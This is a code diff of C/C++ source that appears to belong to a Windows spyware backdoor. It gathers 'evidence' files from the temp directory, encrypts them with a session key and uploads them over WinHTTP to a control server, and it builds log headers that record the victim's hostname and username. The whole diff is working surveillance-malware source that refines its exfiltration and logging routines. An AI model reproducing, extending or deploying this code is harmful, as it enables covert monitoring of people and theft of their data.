@@ -5,9 +5,11 @@
 #include "crypt.h"
 #include "win_http.h"
 #include "proto.h"
+#include "agent_device.h"
 
 extern BYTE pSessionKey[20];
 extern BYTE pLogKey[32];
+extern PDEVICE_CONTAINER pDeviceInfo;
 
 int __cdecl compare(const void *first, const void *second)
 {
@@ -29,17 +31,17 @@ VOID ProcessEvidenceFiles()
 	while(*pPrefix == L'0')
 		pPrefix++;
 	wsprintf(pFindArgument, L"%s\\%S*tmp", pTempPath, pPrefix);
-		
+
 	hFind = FindFirstFile(pFindArgument, &pFindData);
 	if (hFind == INVALID_HANDLE_VALUE)
 		return;
 
 	ULONG x = 0;
 	do
-		if (pFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-			continue;
-		else
-			x++;
+	if (pFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+		continue;
+	else
+		x++;
 	while (FindNextFile(hFind, &pFindData) != 0);
 	FindClose(hFind);
 
@@ -68,7 +70,7 @@ VOID ProcessEvidenceFiles()
 		ULONG uFileNameLen = wcslen(pTempPath) + wcslen(pFindDataArray[x].cFileName);
 		PWCHAR pFileName = (PWCHAR)malloc(uFileNameLen * sizeof(WCHAR) + 2);
 		wsprintf(pFileName, L"%s\\%s", pTempPath, pFindDataArray[x].cFileName);
-		
+
 		BOOL bFileSent = FALSE;
 		HANDLE hFile = CreateFile(pFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 		if (hFile)
@@ -83,18 +85,25 @@ VOID ProcessEvidenceFiles()
 					*(PULONG)pFileBuff = uFileSize; // fize
 					if (ReadFile(hFile, pFileBuff + sizeof(ULONG), uFileSize, &uOut, NULL))
 					{
-						WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE, pFileBuff, uFileSize + sizeof(ULONG), pSessionKey, &pCryptedBuffer));
-						free(pCryptedBuffer);
+						if (WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE, pFileBuff, uFileSize + sizeof(ULONG), pSessionKey, &pCryptedBuffer)))
+						{
+							free(pCryptedBuffer);
 
-						ULONG uResponseLen;
-						PBYTE pResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
-						Decrypt(pResponseBuffer, uResponseLen, pSessionKey);
-						
-						if (*(PULONG)pResponseBuffer == PROTO_OK)
-							bFileSent = TRUE;
+							ULONG uResponseLen;
+							PBYTE pResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
+							if (pResponseBuffer)
+							{
+								Decrypt(pResponseBuffer, uResponseLen, pSessionKey);
 
-						free(pResponseBuffer);
+								if (*(PULONG)pResponseBuffer == PROTO_OK)
+									bFileSent = TRUE;
+								free(pResponseBuffer);
+							}
+						}
 					}
+#ifdef _DEBUG
+					OutputDebugString(L"[!!] WinHTTPSendData FAIL @ log_files.cpp:105\n");
+#endif
 					free(pFileBuff);
 				}
 			}
@@ -108,7 +117,8 @@ VOID ProcessEvidenceFiles()
 	free(pFindArgument);
 }
 
-HANDLE CreateLogFile(ULONG uEvidenceType, PBYTE pAdditionalHeader, ULONG uAdditionalLen)
+// FIXME: switch per tornare buffer e nn scrivere su file.
+HANDLE CreateLogFile(ULONG uEvidenceType, PBYTE pAdditionalHeader, ULONG uAdditionalLen, BOOL bCreateFile, PBYTE *pOutBuffer, PULONG uOutLen)
 {
 	LPWSTR pTempPath, pFileName, pFileSuffix, pTempFileSuffix;
 	FILETIME uFileTime;
@@ -120,50 +130,64 @@ HANDLE CreateLogFile(ULONG uEvidenceType, PBYTE pAdditionalHeader, ULONG uAdditi
 	OutputDebugString(pDebugString);
 	free(pDebugString);
 #endif
-	//TODO FIXME: check for filesystem space
-	GetSystemTimeAsFileTime(&uFileTime);
 
-	pFileName = (LPWSTR)malloc(32767 * sizeof(WCHAR));
-	pTempPath = (LPWSTR)malloc(32767 * sizeof(WCHAR));
-	pFileSuffix = pTempFileSuffix = (LPWSTR)malloc(32767 * sizeof(WCHAR));
-	wsprintf(pFileSuffix, L"%S", BACKDOOR_ID + 4);
-	while(*pTempFileSuffix == L'0')
-		pTempFileSuffix++;
-
-	GetEnvironmentVariable(L"TMP", pTempPath, 32767 * sizeof(WCHAR));
-	do
+	if (bCreateFile)
 	{
-		wsprintf(pFileName, L"%s\\%s%x%x.tmp", pTempPath, pTempFileSuffix, uFileTime.dwHighDateTime, uFileTime.dwLowDateTime);
-		hFile = CreateFile(pFileName, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+		//TODO FIXME: check for filesystem space
+		GetSystemTimeAsFileTime(&uFileTime);
 
-		uFileTime.dwLowDateTime++;
-		if (uFileTime.dwLowDateTime == 0)
-			uFileTime.dwHighDateTime++;
+		pFileName = (LPWSTR)malloc(32767 * sizeof(WCHAR));
+		pTempPath = (LPWSTR)malloc(32767 * sizeof(WCHAR));
+		pFileSuffix = pTempFileSuffix = (LPWSTR)malloc(32767 * sizeof(WCHAR));
+		wsprintf(pFileSuffix, L"%S", BACKDOOR_ID + 4);
+		while(*pTempFileSuffix == L'0')
+			pTempFileSuffix++;
+
+		GetEnvironmentVariable(L"TMP", pTempPath, 32767 * sizeof(WCHAR));
+		do
+		{
+			wsprintf(pFileName, L"%s\\%s%x%x.tmp", pTempPath, pTempFileSuffix, uFileTime.dwHighDateTime, uFileTime.dwLowDateTime);
+			hFile = CreateFile(pFileName, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+
+			uFileTime.dwLowDateTime++;
+			if (uFileTime.dwLowDateTime == 0)
+				uFileTime.dwHighDateTime++;
+		}
+		while (hFile == INVALID_HANDLE_VALUE);
+#ifdef _DEBUG
+		pDebugString = (LPWSTR)malloc(4096);
+		wsprintf(pDebugString, L"[+] New log file %s created\n", pFileName);
+		OutputDebugString(pDebugString);
+		free(pDebugString);
+#endif
+		free(pTempPath);
+		free(pFileSuffix);
 	}
-	while (hFile == INVALID_HANDLE_VALUE);
-#ifdef _DEBUG
-	pDebugString = (LPWSTR)malloc(4096);
-	wsprintf(pDebugString, L"[+] New log file %s created\n", pFileName);
-	OutputDebugString(pDebugString);
-	free(pDebugString);
-#endif
-	free(pTempPath);
-	free(pFileSuffix);
 
-	ULONG uFileLen, uOutLen;
-	PBYTE pLogFileBuffer = CreateLogHeader(uEvidenceType, NULL, 0, &uFileLen);
-	WriteFile(hFile, pLogFileBuffer, uFileLen, &uOutLen, NULL);
-	free(pLogFileBuffer);
+	ULONG uFileLen;
+	PBYTE pLogFileBuffer = CreateLogHeader(uEvidenceType, pAdditionalHeader, uAdditionalLen, &uFileLen);
+	if (bCreateFile)
+	{
+		ULONG uOut;
+		WriteFile(hFile, pLogFileBuffer, uFileLen, &uOut, NULL);
+		free(pLogFileBuffer);
 
 #ifdef _DEBUG
-	pDebugString = (LPWSTR)malloc(4096);
-	wsprintf(pDebugString, L"[+] Written %d bytes on %s\n", uFileLen, pFileName);
-	OutputDebugString(pDebugString);
-	free(pDebugString);
+		pDebugString = (LPWSTR)malloc(4096);
+		wsprintf(pDebugString, L"[+] Written %d bytes on %s\n", uFileLen, pFileName);
+		OutputDebugString(pDebugString);
+		free(pDebugString);
 #endif
+		free(pFileName);
+		return hFile;
+	}
+	else
+	{
+		*pOutBuffer = pLogFileBuffer;
+		*uOutLen = uFileLen;
 
-	free(pFileName);
-	return hFile;
+		return (HANDLE)NULL;	
+	}
 }
 
 PBYTE CreateLogHeader(ULONG uEvidenceType, PBYTE pAdditionalData, ULONG uAdditionalDataLen, PULONG uOutLen)
@@ -218,7 +242,7 @@ PBYTE CreateLogHeader(ULONG uEvidenceType, PBYTE pAdditionalData, ULONG uAdditio
 	// hostname
 	memcpy(pTempPtr, wHostName, pLogHeader.uDeviceIdLen);
 	pTempPtr += pLogHeader.uDeviceIdLen;
-	
+
 	// username
 	memcpy(pTempPtr, wUserName, pLogHeader.uUserIdLen);
 	pTempPtr += pLogHeader.uUserIdLen;
@@ -235,7 +259,7 @@ PBYTE CreateLogHeader(ULONG uEvidenceType, PBYTE pAdditionalData, ULONG uAdditio
 
 	if (uOutLen)
 		*uOutLen = uPaddedHeaderLen + sizeof(ULONG);
-	
+
 	return (PBYTE)pFinalLogHeader;
 }
 
